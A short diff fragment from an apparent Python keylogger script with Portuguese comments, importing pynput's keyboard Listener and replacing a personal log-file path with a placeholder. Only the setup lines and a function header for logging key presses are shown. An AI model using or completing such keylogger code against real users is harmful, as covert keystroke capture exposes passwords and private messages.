@@ -6,7 +6,7 @@
 from pynput.keyboard import Listener
 
 #Localização onde será salvo o arquivo de log
-logFile = "/home/welquer/Documentos/script/Python/log.txt"
+logFile = "Caminho do txt"
 
 #Função para receber tecla pressionada
 def writeLog(key):
